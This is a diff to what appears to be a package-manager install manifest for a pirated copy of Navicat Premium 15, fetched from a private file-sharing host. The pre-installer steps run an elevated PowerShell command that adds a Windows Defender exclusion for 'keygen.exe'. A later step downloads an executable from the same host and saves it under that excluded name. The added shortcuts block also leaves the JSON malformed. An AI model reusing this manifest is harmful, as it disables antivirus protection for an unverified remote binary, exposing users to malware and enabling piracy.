@@ -5,7 +5,7 @@
 	"hash": "md5:eb4bd68604c34b32c8891d39c33e8ecd",
 	"url": "https://m50006.gzcm.natzf.com/fbdownload/Navicat.rar?_sid=%22tozkqRdvtARmQ1780PDN123456%22&mode=%22download%22&stdhtml=false&dlink=%222f536f6674776172652f6275636b65742f4e6176696361742e726172%22&SynoToken=qo5C90gAE4JSg",
 	"extract_dir": "Navicat Premium 15",
-	"pre-installer": [
+	"pre_installer": [
 		"$key=$dir.ToString()+'\\keygen.exe'",
 		"Start-Process powershell \"Add-MpPreference -ExclusionPath $key\" -Verb RunAs"
 	],
@@ -15,4 +15,10 @@
 			"$client.DownloadFile('https://m50006.gzcm.natzf.com/fbdownload/Navicat.exe?_sid=%22tozkqRdvtARmQ1780PDN123456%22&mode=%22download%22&stdhtml=false&dlink=%222f536f6674776172652f6275636b65742f4e6176696361742e657865%22&SynoToken=qo5C90gAE4JSg', $dir.ToString()+'\\keygen.exe')"
 		]
 	}
+	"shortcuts": [
+		[
+			"navicat.exe",
+			"Navicat"
+		]
+	]
 }
